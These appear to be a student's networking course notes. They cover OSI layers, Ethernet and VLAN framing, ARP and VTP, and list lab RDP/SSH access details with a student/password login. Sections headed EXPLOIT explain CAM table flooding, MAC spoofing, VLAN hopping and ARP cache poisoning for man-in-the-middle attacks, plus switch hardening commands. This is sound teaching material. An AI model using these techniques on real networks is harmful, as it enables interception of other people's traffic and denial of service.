# Networking


## Sites:
Miroboard Networking - https://miro.com/app/board/o9J_klSqCSY=/

draw.io - https://app.diagrams.net/

CTFD - MASO-M-005@10.50.20.180:8000/challenges

CTFD Resources - http://10.50.20.180:8000/resources

CTFD Practice - http://networking-practice-ctfd.server.vta:8000/

CTCC Network - https://net.cybbh.io/public/networking/latest/schedule.html

xfreerdp /v:10.50.x.x /u:student /p:password /size:1920x1000 +clipboard

Subnet Chart: https://www.engineeringradio.us/blog/wp-content/uploads/2013/01/Subnet_Chart.pdf

Miro Whiteboard - https://miro.com/app/board/o9J_klSqCSY=/?share_link_id=16133753693

Student# student9

Command: ssh student@10.50.40.108 -X

Password: password


## VPN Setup:
```
    VPN Config File

    Installing the VPN client

        Windows
            Download Openvpn Client
            Install the client
            Save the contents of the VPN Config File as config.ovpn in the config directory for openvpn: "c:/Program Files/OpenVPN/config/config.ovpn"
            Run OpenVPN as administrator once the file is in the config directory.
            Right click on the icon and click on connect
            Enter username and password for IPA (git and vta credentials)

        Linux
            Type sudo apt-get install openvpn -y in the terminal
            Save the contents of the VPN Config File as config.ovpn in the directory location of your choosing and change directories to it
            Type sudo openvpn --config config.ovpn &
            When connecting to the VPN use the username and password you just created with the IPA server

        Mac
            Install tunnelblick
            Once installed, enter the VPN details.
            Save the contents of the VPN Config File as config.ovpn
            Drag the provided config.ovpn file into the configurations.
            When connecting to the VPN use the username and password you just created with the IPA server
            Hit connect and you should see the connection because the icon will turn green and you will see a timer start.
            Install Microsoft Remote Desktop for Mac OS
            Once MRD is installed, click the button with the + symbol and add pc.
            Put your floating IP where it says PC name, add user account from dropdown.
            Put your user name:password for system and click add
            You will be able to connect from there
```


----


# Lesson 1: Fundamentals


## Slides

Network Access: https://net.cybbh.io/-/public/-/jobs/874001/artifacts/modules/networking/slides-v4/01_data.html

Network Layer: https://net.cybbh.io/-/public/-/jobs/874001/artifacts/modules/networking/slides-v4/02_network.html

Transport to Application Layer: https://net.cybbh.io/-/public/-/jobs/874001/artifacts/modules/networking/slides-v4/03_transport.html

Traffic Capture: https://net.cybbh.io/-/public/-/jobs/874001/artifacts/modules/networking/slides-v4/06_traffic_cap.html


## OSI Model

7 Layer OSI MODEL (PDNTSPA)
![image](https://github.com/user-attachments/assets/6eb18223-a459-48a3-a01e-0fed85fb986a)

PDU Protocol Data Unit -

But Free Pizza So Delicous(x4)

Application = DATA

Presentation = DATA

Session = DATA

Transport = SEGMENTS

Network = PACKET

DataLink = FRAME

Physical = BIT


## Internet Standard Organizations

Internet Engineering Task Force (IETF) - RFCs are documents for standardization
```
Mostly known for developing and publishing "white paper" standards known as Request for Comment (RFC).

Some notable ones are:
* IPv4 (791)
* IPv6 (2460)
* TCP (793)
* UDP (768)
* HTTP 1.1 (2616)
* List of other from Wikipedia
```


Internet Assigned Numbers Authority (IANA) - Internet Numbers 
```
Controls all internet numbers such as:
* MAC OUI numbers
* Ethertypes
* IPv4 and IPv6 addresses
* IPv4 and IPv6 Multi-cast addresses
* Protocol Numbers
* Port Numbers
* 16/32-bit AS Numbers
* Domain Names (Root)
* ARP Operation Codes
```

Institute of Electrical and Electronics Engineers (IEEE) - LAN/WAN Electrical Standards
```
Most notably they developed standards for Local Area Networks (802 series) such as:

* 802.1 - LAN and WAN bridging and security
* 802.2 - LLC sub-layer
* 802.3 - Ethernet (CSMA/CD)
* 802.11 - Wireless LAN
* 802.15 - Wireless PAN
```
# Layer 1 Data
## Binary
```
Base2- Two Symbols (0 and 1)

Groups:
Bit(1 bit)
Nibble(4 bits
Byte(8 bits)
Halfword (16 bits)
Word (32 bits)

128    64    32    16    8    4    2    1
 0      0     0     0    0    0    0    0
```

![image](https://github.com/user-attachments/assets/edfb586b-f9a2-4730-a3f8-4e7a47fbed44)


## Hexadeciaml
```
Base 16 - Sixteen Symbols (0-9 and A-F)

8    4    2    1    8    4    2    1
0    1    0    1    0    0    0    1

= 51

FF =

1    1    1    1    1    1    1    1


```

![image](https://github.com/user-attachments/assets/19762878-de97-4759-a413-4f224f77fd01)

![image](https://github.com/user-attachments/assets/16d02c44-9008-4c7f-9d94-ebca2d0e4d5e)


## Base64
```
Base64 = 64 Symbols (A-Z, a-z, 0-9, +, /)
Users (=) to represent a NULL value (max of 2)
Format = MTI= MTIzNA== MTIzNDU2Nzg=

```

![image](https://github.com/user-attachments/assets/50aa4e8c-2d16-4e2d-8e3e-1a00dcaf2054)


# Lan Topologies
## Bus
![image](https://github.com/user-attachments/assets/e6915d00-fa55-4374-9ddd-0ede65939b17)

## Star
Central Node passes it to everyone else 

![image](https://github.com/user-attachments/assets/2a299de8-66b6-42d8-bc7b-dc631f301926)

## Ring
Every workstation is plugged into everyone else and it goes 1 way in a ring

![image](https://github.com/user-attachments/assets/ceded32a-f364-4af0-ad10-ddbb40173d24)

## Mesh
Everyone is connected to everyone 

![image](https://github.com/user-attachments/assets/90699989-c44d-4b21-b06f-27527b9041b7)

## Wireless
Routes via APs and no need for centeralized transmissions

![image](https://github.com/user-attachments/assets/3a9c938c-35be-4ede-88fa-4292432e439e)

## Hierarchial
Information is broken down to tiers 
```
Core

Distribution

Access Layer
```

![image](https://github.com/user-attachments/assets/89c7d021-1ddc-486f-a8fa-517c50957e73)


# Devices
## Hub
Passes information through everyone. Can have collisions where the packets are sent at the same time and clash

## Repeaters
Used to extended a signal to repeat and make it go further due to the limitations on some cabling

## Switches
Similar to hubs but can use Collision Domain and it knows what you are addressing using a MAC Addresss to reduce collisions.

## Routers
Allows you to cross networks using routing tables. Can connect different nets together. One router can connect a LAN to another LAN to create a WAN


## Ethernet Timing (BIT-TIME)
Bit Time - is the period of time is required for a bit to be placed and sensed on the media. Network speeds are measured by how many bits can be placed or sensed on the media in 1 second. Each increase in speed requires more bits to be sent during the same 1 second internal. To accomplish this the bit-times are reduced.

```
Speed       Bit-Time
10 mbps     100ns
100 mbps    10ns
1 Gbps      1ns
10 Gbps     .1ns
100 Gbps    .01ns
```

# Layer 2 Data Link
## Sublayers
MAC (Medium Access Control)

LLC (Logical Link Control)

## Message Formatting Method and Terminology

![image](https://github.com/user-attachments/assets/b2477912-db59-4914-8224-883a7ed47ac6)

HEader - Layer 2 to Layer 7

Data - Payload

Footer - FCS/CRC ( FrameCheckSequence and CyclicRedundancyCheck)

## Encapsulation and Decapsulation
When data is being trasmitted through the OSI Model header and footers are constantly being stripped and added

![image](https://github.com/user-attachments/assets/2a66375c-55bd-4ed2-97a0-200c5ddc5007)

![image](https://github.com/user-attachments/assets/5df51644-8f08-473c-bec7-14e6023b0582)

## Switches
```
Build MAC-Address (Content Addressible Memory (CAM)) Table
- Learns by reading Source MAC Address

Forwarding Frames
- Decision based on Destination MAC Address

Operational Modes
- Cut Through - (sometimes called fast forward) only examines the destination address before forwarding it to its destination segment. This is the fastest switching mode but requires the interfaces to be the same speed.

- Fragment-Free - Checks the entire packet and verifies its not split up

- Store-and-Forware - accepts and analyzes the entire frame before forwarding it to its destination
```

## EXPLOITS
```
CAM Table Overflow/ Media Acces Control (MAC) Attack
- flooding attack, is a type of security exploit that targets network switches. This attack aims to overwhelm a switch’s CAM table, which is used to store MAC address-to-port mappings, leading to a denial of service (DoS) condition or facilitating a man-in-the-middle attack.
- Similar to a buffer overflow attack, the goal is to fill the switches table with "learned" MAC addresses and see what happens. The attacker sits on one port and generates a vast number of "spoofed" MAC entries. When the CAM table is full, all additional MACs will not be learned and will default to "open". This means that traffic without a CAM entry will be flooded out on all ports of the VLAN in question. Traffic with a CAM entry won’t be affected, but neighbor switches could be.

```

## MAC Address
```
Length = 48 bit | 6 byte | 12 hex
Format =
Windows : 01-23-45-12-34-56
unix-Linux : 01:23:54:12:34:56
Cisco : 1234.5612.3456

Parts
OUI - First 24-bits assigned by IANA
Vender Assigned - Last 24-bits

```

![image](https://github.com/user-attachments/assets/76290b2b-1b54-4b9d-b330-5fad385e2a77)

```
Types:
Unicast - One to One 8th bit is OFF

MultiCast - One to MANY 8th bit is ON

BroadCast - One to ALL 8th bit is ON
```

## MAC Spoofing

```
Could not be changed at first
Used to be called:
hardware
firmware
burned-in

Now it can be changed w/ software



Spoofing is the act of disguising a communication from an unknown source as being from a known or trusted source. Spoofing is an attack vector done at several different layers of the OSI. At the Data-link layer attackers will commonly spoof the MAC-address.

Originally MAC addresses were hard coded into the firmware of the NIC and could not be easily changed. This is why MAC addresses were commonly called "Firmware", "Hardware", or "Burned-in" addresses. In order to facilitate MAC spoofing attacks it required crafting of special frames with the MAC address pre-programmed in.

Today most MAC addresses are programmed using the software. This makes modification of a device’s MAC address much simpler. In order to perform a MAC spoofing attack the malicious actor can either change their MAC address to a known or trusted address or create crafted frames with the MAC address already programmed in. MAC spoofing can be used to perform:

ARP-Cache poisoning - modify the ARP cache of devices on the same network segment.

ARP Man-in-the-middle (MitM) attacks - Specially crafted ARP messages to force 2 or more victims to send traffic thru the attacker’s system. Here the attacker can sniff or alter traffic.

```

## Ethernet Header and Frame

![image](https://github.com/user-attachments/assets/ef5da628-1f90-435b-80fc-8509589af70e)

![image](https://github.com/user-attachments/assets/c9c33467-ee6f-4aac-88a8-54c51ee84f3a)

![image](https://github.com/user-attachments/assets/4c60dcac-dc44-418d-a669-c63a8d3e1339)

```
Structure:

    Preamble (7 bytes) +Consists of alternating 1’s and 0’s to allow network synchronization with receiver clocks. Ethernet is self-clocked, the clock is extracted from the signal. The clock is used to set the bit-timing. This is so that the receiver knows what speed the bits will be arriving at. This is stripped off at the NIC and not visible by packet analyzer software.

    SFD (Start Frame Delimiter) (1 byte field) Marks the end of the preamble, and the beginning of the Ethernet frame and send an announcement that data is about to be sent to any other hosts on the same network segment. This is stripped off at the NIC and not visible by packet analyzer software.

    Destination MAC Addresses (6 bytes)

        Initial 6 bytes (48 bits) contain the Destination MAC address.

        This can be Unicast, Multicast, or Broadcst MAC address.

        This is sent first to assist in switch operation of the cut-through mode.

    Source MAC Addresses (6 bytes)

        Next 6 bytes (48 bits) contain the Source MAC Address.

        This is always a Unicast MAC address.

        It is worth noting that this is pretty much the only time that the destination address comes before the source. The source address will come first in most other headers that we deal with in this course.

    Ethertype (2 bytes) Used to indicate the next protocol encapsulated in the frame. This is provided by the LLC sub-layer.

        Common Ethertypes controlled by IANA.org:

            0x0800 - IPv4

            0x0806 - ARP

            0x86DD - IPv6

            0x8100 - VLAN Tagging 802.1q

            0x88A8 - Service VLAN tag identifier (S-Tag) (Q-in-Q tunnel)

            0x8863(4) - PPP over Ethernet (PPPoE)

            0x8847(8) - MPLS

            0x8892 - PROFINET Protocol

    Data / Payload (46-1500 bytes)

        Consists of the encapsulated upper layer headers and data payload which may be 46-1500 bytes.

        The minimum 46 bytes is based on the fact that the smallest "legal" ethernet frame size is 64 bytes; so 46 bytes of data with 18 bytes of Frame header equates to 64 bytes. Anything less than 64-bytes is assumed to be a collision fragment (or "runt"). "Padding" is used when there is less than 46-bytes of data.

        The maximum data bytes is determined by the MTU for the network segment. The MTU is the maximum size of the payload of the frame of the particular network. Ethernet II by default has a max MTU of 1500 bytes. This MTU is the amount of encapsulated data. MTU of 1500 plus the 18 byte header equates to 1518 bytes. Anything greater than this may be considered a "Jumbo" frame.

        This typically is the size of the IP packet but can be the size of other encapsulated protocols like ARP or IPv6.

        The Frame header is not calculated in to this size. So the frame size could be 1518 bytes (or more) in total when the 18 byte header is added. It’s worth noting that the 1500 bytes is of total encapsulated information and not exclusively user data. This 1500 bytes includes the 20+ byte IPv4 header and 20+ byte TCP header. If VPN or tunneling is involved then the extra headers must also fit within this 1500 bytes.

        MTU defaults:

            1500 - Ethernet

            17914 - 16 MBPS Token Ring

            4464 - 4 MBPS Token Ring

            4352 - FDDI

            2304 - IEEE 802.11 Wi-FI (WLAN)

            1280 - IPv6 path

            1492 - IEEE 802.3/802.2

            1480 - PPoE (WAN Miniport)

            576 - X.25

        If there are any other headers included, such as IPSEC, IPv4 or TCP options, then this would mean that even less user data can be encapsulated.

    FCS/CRC (Frame Check Sequence / Cyclical Redundancy Check) (4 bytes)

        Mathematical formula calculated on the entire frame. This calculation is appended in the FCS field so that the receiver can determine if the contents of the frame were corrupted in transit. This is stripped off at the NIC and not visible by packet analyzer software.

```

# VLANs (802.1Q)
## Virtual Local Area Network


![image](https://github.com/user-attachments/assets/5d0a46c8-aa5f-4b16-b9b2-6f1001c29ccf)

```
This tagging allows network administrators to logically segment a single physical network into multiple virtual networks, known as VLANs, to improve network performance, security, and manageability.
802.1Q Frame

Allows you to be able to seperate locally and logically seperated devices to be able to communicate with or without eachother via port assigning

Assign VLANS Via Interfaces

VLAN 10 = Users
VLAN 22 = Printers
VLAN 100 = SuperSecret
```
```
    Structure:

        MAC Header (12 byte field)

            Initial 6 bytes contain the Destination MAC address

            Next 6 bytes contain the Source MAC Address

        VLAN Tag (4 byte field)

            Tag Protocol ID (2 byte field)
            Initial 2 bytes contain the new effective Ethertype field of 0x8100 indicating tagging

            Tag Control Information (2 byte field)

                Priority Code Point (3 bits)
                This is used to add prioritization or QoS to VLANs

                Drop Eligible Indicator (1 bit)
                This adds drop eligibility to VLAN traffic in case of congestion

            VLAN ID (12 bit field)
            To specify the VLAN number. Can be 0x000 to 0xfff or 0* to 4095.

                1 to 1005 Normal range

                1003 to 1005 – reserved for Token Ring

                1006 to 4094 – Extended Range

        Ethertype (2 byte field)
        Used to indicate the next protocol encapsulated in the frame.

        Data / Payload (46-1500 byte field)
        Consists of the encapsulated upper layer headers and data payload which may be 46-1500 bytes

        FCS/CRC (Frame Check Sequence / Cyclical Redundancy Check) (4 byte field)
        A new calculation is conducted to accommodate the addition of the new tag information. This calculation is done by the switch or router that added the tag. This also will be stripped off by the receiving NIC and will not be viable by the network analyzer.

```

## VLAN Types
```
    Default - VLAN 1 is the default vlan. VLAN 1 will always be present on the switch and can not be deleted. All ports will be assigned to VLAN 1. When VLAN assignment is removed from a port it will automaticcally be assigned to VLAN 1.

    Data - VLANs assigned for user traffic.

        Data VLANs are used to separate user data traffic based on different groups, departments, or functions.

        Devices within the same data VLAN can communicate with each other as if they are on the same physical network.

    Voice - VLAN assigned for use for voice traffic only. Typically uses CDP messages from VOIP phones to be asigned.

        Voice VLANs are used to separate voice traffic from data traffic in networks that support Voice over IP (VoIP) systems.

        This VLAN is configured to carry voice traffic, ensuring quality of service (QoS) for voice communications.

    Management - A form of data VLAN used for switch/router remote management purposes.

        A management VLAN is a VLAN used for managing networking devices such as switches, routers, and access points.

        This VLAN is often used for remote device management, configuration, and monitoring purposes.

        It helps secure management traffic by segregating it from user data traffic.

    Native - VLAN used for switch/router generated traffic.

        These are used for control traffic such as CDP, VTP, DTP, and STP. These do not normally have "tags" applied.

        Native VLANs by default is VLAN 1 but is highly recommended to change.

        The native VLAN is used on trunk links to carry untagged frames.

        Frames from the native VLAN are not tagged when traversing trunk links, while frames from other VLANs are tagged.

```

## Without VLANs
```


Networks without VLANs operate as a single broadcast domain, where all devices connected to the same physical network segment can communicate with each other without any logical segmentation.

    Single Broadcast Domain:

        In networks without VLANs, all devices connected to the same physical network segment receive broadcast traffic intended for the entire segment.

        Broadcast traffic includes protocols such as ARP (Address Resolution Protocol) and DHCP (Dynamic Host Configuration Protocol), as well as other network-wide announcements. Each physical interface on a router is assigned to a different network. Will need one physical interface per network required. Future planning is critical as additional added networks can be difficult and costly to install.

        All hosts on the switched LAN are part of the same network and only a router can segment networks.

        In normal operation, when a switch receives a broadcast frame on one of its ports, it forwards the frame out all other ports except the port where the broadcast was received.

        On a switch with only 1 vlan configured (vlan 1 by default) all ports belong to same broadcast domain.

    Flat Network Structure:

        Networks without VLANs typically have a flat network structure, where all devices are part of the same logical network.

        Devices within the network can communicate directly with each other without the need for routing between subnets or VLANs.

    Limited Segmentation and Isolation:

        Without VLANs, there is limited segmentation and isolation of network traffic.

        Devices in different departments, groups, or security zones share the same broadcast domain and have unrestricted access to each other’s traffic, which can present security and performance challenges.

    Broadcast Storms and Traffic Congestion:

        In networks without VLANs, broadcast storms can occur if a device generates a large amount of broadcast traffic, overwhelming the network and causing performance degradation.

        Similarly, network congestion can occur as all devices share the same network bandwidth, leading to potential bottlenecks.



```

## With VLANs
```
Networks with VLANs (Virtual Local Area Networks) offer greater flexibility, security, and efficiency compared to traditional networks without VLANs. VLANs allow network administrators to logically segment a single physical network into multiple virtual networks, each with its own broadcast domain.

    Logical Segmentation:

        VLANs allow network administrators to logically segment the network into multiple broadcast domains, regardless of the physical network topology. Devices within the same VLAN can communicate with each other as if they were on the same physical network segment, while traffic between VLANs typically requires routing.

        When VLANs are implemented on a switch, the transmission of unicast, multicast, and broadcast traffic from a host in a particular VLAN are restricted to the devices that are in that VLAN only.

    Broadcast Isolation:

        Each VLAN forms a separate broadcast domain, reducing the scope of broadcast traffic. Broadcast traffic generated within a VLAN is only forwarded to devices within that VLAN, improving network efficiency and reducing unnecessary traffic on other VLANs.

    Enhanced Security:

        VLANs provide enhanced security by segregating network traffic and controlling communication between different groups of devices. Access control lists (ACLs) and firewall policies can be applied at VLAN boundaries to restrict traffic flow between VLANs based on security policies.

    Improved Performance:

        By dividing the network into smaller broadcast domains, VLANs can reduce broadcast traffic and network congestion, leading to improved performance and better overall network efficiency.

    Flexibility:

        VLANs provide flexibility in network design and management, allowing administrators to easily add, remove, or modify VLAN configurations without physical reconfiguration of network infrastructure.

        All the "tagging" processes are completely transparent to the "user" and is handled by the intermediary network devices.

        When the switch receives a frame on a port configured in access mode and assigned a VLAN, the switch will then determine what interface to send the frame out. If the outgoing interface happens to be a trunk port, the switch inserts the VLAN tag in the frame header, recalculates the Frame Check Sequence (FCS), and sends the tagged frame out of that trunk port. Inversely, when a switch receives a tagged frame from a trunk link and it determines that the outgoing interface is an access port, the switch will remove the vlan tag and the FCS is recalculated again. The Type field is also reverted back to its original value. The 4-byte tag is removed and the Type field reverts back to its original location at [12:2].

```

## VLANs 802.1AD Double Tagging

![image](https://github.com/user-attachments/assets/0a9911f1-a0ad-401f-996c-0bdea2dc199c)

```


IEEE 802.1ad is an Ethernet networking standard informally known as "Q-in-Q". The was added as an amendment to IEEE standard IEEE 802.1Q-1998. This technique was commonly used for provider bridging or tagging. A service provider could tag already tagged user frames across a service providers network and then strip it off at the other end; this is a form of tunneling.

This technique allowed the ability to insert more than one 4 byte tag into the frame. Each additional tag is inserted before the previous tag. The tags are then removed in reverse order. The first tag will be the typical 0x8100 Ethertype and include the user provided VLAN ID. Each additional tag will use 0x88A8 (standard) or 0x9100 (non-standard) Ethertype and include the provider’s VLAN ID.

    Standard VLAN Tagging (IEEE 802.1Q):

        In a standard VLAN tagging scenario, each Ethernet frame includes a 4-byte VLAN tag inserted between the source MAC address and the EtherType/Length field.

        Ethertype uses is 0x8100.

        This VLAN tag contains information such as the VLAN ID (VID) that identifies the VLAN to which the frame belongs.

        IEEE 802.1Q supports up to 4096 VLANs (VLAN IDs 1-4094), allowing network administrators to segment a network into multiple virtual LANs.

    QinQ VLAN Tagging:

        QinQ extends VLAN tagging by adding another layer of VLAN tags, effectively allowing VLAN tagging within VLAN tagging.

        In a QinQ scenario, the original Ethernet frame is encapsulated within another VLAN tag, creating a "tagged outer frame" with its own VLAN ID.

        This outer VLAN tag provides a second level of VLAN identification, allowing for hierarchical VLAN structures.

        The original VLAN tag remains intact, providing the VLAN segmentation information within the inner frame.

        Outer VLAN tag uses the Ethertype of 0x88A8.

    Usage and Benefits:

        QinQ VLAN tagging is commonly used in service provider networks, particularly in metro Ethernet deployments.

        It allows service providers to deliver multiple customer VLANs transparently over a single Ethernet link, preserving the VLAN segmentation of each customer.

        By using QinQ, service providers can avoid VLAN ID conflicts between different customers' VLANs and simplify VLAN management.

        QinQ also enables the creation of "service VLANs" or "provider VLANs" to carry traffic from multiple customer VLANs over a shared infrastructure while maintaining isolation between customers.

    Frame Format:

        In QinQ VLAN tagging, the Ethernet frame contains two 802.1Q headers:

        The outer VLAN tag (or "service tag") contains the service provider’s VLAN ID.

        The inner VLAN tag (or "customer tag") contains the customer’s VLAN ID.

        The outer VLAN tag precedes the inner VLAN tag, and the original Ethernet frame is encapsulated between them.

    IEEE 802.1ad was created for the following reasons:

        802.1Q has a 12-bit VLAN ID field, which has a theoretical maximum of 4096 tags (212). With the growth of network this has become a limitation. A double-tagged frame however has two 12 byte VLAN ID fields. This can have a theoretical max of 4096×4096 or 16,777,216 VLAN IDs.

        A tag stack creates a mechanism for some Internet Service Providers to encapsulate customer tagged 802.1Q traffic within another tag thus creating a Q-in-Q frame. The second (outer tag) is used to identify and segregate traffic from different customers; the inner tag is preserved from the original frame.

        Using Q-in-Q provides a means of constructing Layer 2 tunnels, or even applying Quality of service (QoS) policies.

        802.1ad is upward compatible with 802.1Q. Although 802.1ad is limited to two tags, there is no ceiling on the standard limiting a single frame to more than two tags, allowing for growth in the protocol. In practice Service Provider topologies often anticipate and utilize frames having more than two tags.

        It is easier for networking equipment makers to modify their existing equipment by creating multiple 802.1Q headers than to modify their equipment to implement some hypothetical new non-802.1Q extended VLAN ID field header.

```

## EXPLOIT VLAN Hopping



VLAN hopping Attack

VLAN hopping is an exploit method of attacking networked devices on separate virtual LAN (VLAN) without traversing a router or other Layer 3 device. The concept behind VLAN hopping attacks is for the attacker on one VLAN to gain access to traffic on other VLANs that would normally not be accessible. Keep in mind that VLAN hopping is typically a one-way attack. It will not be possible to get any response from the target device unless methods are setup on the target to respond with similar vlan hopping methods.

There are three primary methods of VLAN hopping:

Switch Spoofing

In this attack, an attacking host imitates a trunking switch by crafting Dynamic Trunking Protocol (DTP) frames in order to form a trunk link with the switch. With a trunk link formed the attacker can then use tagging and trunking protocols such as ISL or 802.1q. Traffic for all VLANs is then accessible to the attacking host.

```
                switch(config)# interface fastethernet 1/10
                switch(config-if)# switchport mode access
                switch(config-if)# switchport nonegotiate
                switch(config-if)# switchport access vlan 10
                switch(config)# iterface gigabit 0/1
                switch(config-if)# switchport trunk encapsulation dot1q
                switch(config-if)# switchport mode trunk
                switch(config-if)# switchport nonegotiate
```

Tagging

This attack typically requires the attacker add the target 802.1Q tag manually to an Ethernet frame even though it is an access port. This process is normally done by the switch. The switch will receive the frame and forward it out the trunk port leading to the target without it needing to be routed. This method requires that the attacker and victim are separated by a trunk and success depends on the switch firmware being vulnerable.

Double Tagging

This attack works if the attacker knows what the "native VLAN" that is used on your organization. Typically VLAN 1 is used. All VLANs will be "tagged" with its corresponding VLAN. The Native VLAN however is intended for local network communication and is not tagged. Thus anything tagged for the native VLAN will be stripped off. The attacker will insert 2 tags into their frames. The first tag will be for the Native VLAN and the second tag will be for whatever VLAN he is trying to access. Upon receipt the switch will then remove the Native VLAN tag and will leave the second VLAN tag in tact. This method also requires that the attacker and victim be separated by a trunk and a vulnerable switch.
```
                switch(config)# vlan dot1q tag native
                switch(config)# interface fastethernet 1/10
                switch(config-if)# switchport mode access
                switch(config-if)# switchport nonegotiate
                switch(config-if)# switchport access vlan 10
                switch(config)# iterface gigabit 0/1
                switch(config-if)# switchport trunk encapsulation dot1q
                switch(config-if)# switchport mode trunk
                switch(config-if)# switchport nonegotiate
                switch(config-if)# switchport trunk native vlan 999

```

# ARP 
Address Resolution Protocol: quick way to resolve MAC to IP Addresses



## Offset

![image](https://github.com/user-attachments/assets/db3f02d6-a276-4d67-8ecf-0100741a4c6f)

```


    Structure:

        Hardware type (HTYPE) This field specifies the network link protocol type.

            1 = Ethernet

            6 = Token Ring

            15 = Frame Relay

        Protocol type (PTYPE) This field specifies the internetwork protocol for which the ARP request is intended. The permitted PTYPE values share a numbering space with those for EtherType.

            0x0800 = IPv4

        Hardware length (HLEN) Length (in octets) of a hardware address.

            6 = Byte size of Ethernet MAC addresses.

        Protocol length (PLEN) Length (in octets) of addresses used in the upper layer protocol. (The upper layer protocol specified in PTYPE.)

            4 = Byte size of IPv4 addresses.

        Operation Specifies the operation that the sender is performing:

            1 = ARP request

            2 = ARP reply

            3 = RARP request

            4 = RARP reply

        Sender hardware address (SHA) Media address of the sender. In an ARP request this field is used to indicate the address of the host sending the request. In an ARP reply this field is used to indicate the address of the host that the request was looking for. (Not necessarily address of the host replying as in the case of virtual media.) Switches do not pay attention to this field, particularly in learning MAC addresses. The ARP PDU is encapsulated in Ethernet frame, and that is why Layer 2 devices examine it.

            In a ARP request, this will be the requestor’s MAC address.

            In a ARP reply, this will be the target’s MAC address.

        Sender protocol address (SPA) Internetwork address (usually IPv4 Address) of the sender.

            In a ARP request, this will be the requestor’s IP address.

            In a ARP reply, this will be the target’s IP address.

        Target hardware address (THA) Media address of the intended receiver. In an ARP request this field is ignored. In an ARP reply this field is used to indicate the address of the host that originated the ARP request.

            In a ARP request, this will be blank.

            In a ARP reply, this will be the requestor’s MAC address.

        Target protocol address (TPA) Internetwork address (usually IPv4 Address) of the intended receiver.

            In a ARP request, this will be blank.

            In a ARP reply, this will be requestor’s IP address.


```

## Types
```
ARP (OP 1 and 2)
 
RARP (OP 3 and 4)

Proxy ARP (OP 2)

Gratuitous ARP (OP 2)
```

```


ARP - A request and response in order to resolve the destination L2 (MAC) address when only the destination L3 (IPv4) address is known.

    ARP Request Operation code = 1

    ARP Reply Operation code = 2

    ARP Request:

        When a device needs to communicate with another device on the same network segment but only knows the destination’s IP address, it broadcasts an ARP request message to the entire network.

        The ARP request contains the sender’s IP address and MAC address and the IP address of the target device.

    ARP Reply:

        The device with the IP address specified in the ARP request responds with an ARP reply.

        The ARP reply contains the target device’s MAC address.

        Once the sender receives the ARP reply, it can use the MAC address to address frames destined for the target device.

RARP - A request and response in order to resolve the destination L3 (IPv4) address when only the destination L2 (MAC) is known. (This protocol has been deprecated since the widespread use of protocols like BOOTP and DHCP.)

    RARP Request Operation code = 3

    RARP Reply Operation code = 4

    When a device boots up and has no configured IP address, it broadcasts a RARP request onto the local network.

    The RARP request contains the device’s MAC address.

    RARP servers on the network receive the broadcast request and check their tables for a corresponding IP address entry associated with the MAC address.

Gratuitous ARP - An ARP reply that was not requested.

    ARP Reply Operation code = 2

    A gratuitous ARP messages is an ARP messages sent by a device to announce its own IP-to-MAC address mapping to other devices on the network.

    Gratuitous ARP messages are commonly used during network initialization or to update ARP caches in other devices.

    These are commonly used for:

        Help in detecting IP conflicts

        Assist in updating other system’s ARP cache

        To inform switches of the MAC address of the client connected to its port

        Helps pre-load other systems ARP cache when the local systems IP interface comes up

    Maliciously used to:

        Poision a victim’s ARP cache

Proxy ARP - A device (router) answers the ARP queries for IP address that is on a different network.

    The ARP proxy sees the ARP request and determines that the target Network address is not on the local network segment and is aware of how to reach the destination network.

    The proxy will offer its own MAC address in response to the request.

    Typically this device is the network gateway and is responsible to forward traffic for other networks.

    Maliciously the ARP requests can be intercepted and a Proxy ARP sent as a response to poision the victim’s ARP Cache.

ARP Cache - is a collection of Layer 2 to Layer 3 address mappings discovered utilizing the ARP request/response process. When a host needs to send a packet both the L2 and L3 addresses are needed. The host will look in this table to determine if it already knows both the L2 and L3 addresses. If the target is not in the table then a ARP request is initiated. The ARP cache can be populated statically but mostly its done dynamically. This cache can be exploited by attackers with the aim to poison the cache with incorrect information to either perform a DoS or MitM.

```


## ARP Cache
```
All resolved MAC to IP Addresses
If MAC is not in cache then ARP is used
Dynamic entries last from 2-20mins
Default gateway is present at minimum
Can be easily duped by attackers

```

## EXPLOIT MITM with ARM

```


    Address Resolution Protocol (ARP) attack using Gratuitous ARPs

When ARP was developed security was not as much of an issue. Over time it was discovered that many protocols could be used in unintended ways. Typically a host will broadcast an ARP request over the network and expects only the intended host to respond. Gratuitous ARP on the other hand is another method that a host can announce itself to the network. All other hosts believe the message and will add this entry into their ARP cache. These are the legitimate uses of ARP but malicious actors can use the open, unencrypted, and unverified nature of the protocol to their own ends.

An attacker can broadcast a gratuitous ARP, announcing itself as the networks default gateway. It will use the legitimate default gateway’s IP address but will use it’s own MAC address. All hosts on the network will assume this information to be true and update their ARP caches. This in essence will poison everyone’s ARP cache. All hosts on the network will now send all traffic to other networks to the attackers computer. The Attacker will forward all traffic to the legitimate gateway but now the attacker is included in the hosts communication.

This process creates a Layer 2 Man in the Middle.


    Proxy ARP and Security Concerns:

Typically a PC will issue an ARP request to get the unknown MAC address of a device when its IP address is known. If the device is on the same network then that device will respond with ARP Reply. If the device happens to be on a different network, the router will respond with its own MAC address. The router responds because it will see that the destination IP address is on a different network and it knows how to get there from its routing tables. The router will respond to the ARP request with its own MAC to tell the host to send all the communication to itself to get to the remote destination. The host will update its ARP cache to reflect the router (default gateway) to be used to reach remote destinations. This is called a Proxy ARP.

An attacker can intercept ARP requests for a gateway and respond with its own MAC address resulting in a Man in the Middle attack.


```


# VTP 
```
CISCO Proprietary
MODES:

Server
Client
Transparent

```
## VLAN Trunking Protocol
Simplifies an administrators job

![image](https://github.com/user-attachments/assets/aa27e9b7-0a71-4a89-a25a-ef0ec9b8771e)

```
Centrally manage everything

VLAN Trunking Protocol (VTP) is a Cisco proprietary protocol that propagates the definition of Virtual Local Area Networks (VLAN) on the whole local area network. VLAN Trunk Protocol (VTP) was developed to help reduce the administration of creating VLANs on all switches within a switched network. To do this, VTP sends VLAN information to all the switches in a VTP domain.

    Server - can create, modify or delete VLANs. Can create and forward VTP messages.

    Client - can only adopt VLAN information in VTP messages. Can forward VTP messages.

    Transparent - only forwards VTP messages but does not adopt any of the information.

VTP advertisements are sent over all trunk links. VTP messages advertise the following on its trunk ports:

    Management domain

    Configuration revision number

    Known VLANs and their specific parameters

There are three versions of VTP, version 1, version 2, version 3.

```

## VTP Issues
```
Can dumkp all VLAN information
Cause a DoS as a switch will not support conifured VLANs

VTP uses the configuration revision number to determine what is the most "up-to-date" VLAN information. Each time the server makes an update it will send a VTP message with a higher revision number. The other switches will see that the message revision number is higher than what they have recorded so they will adopt the information in the message believing it to be more current.

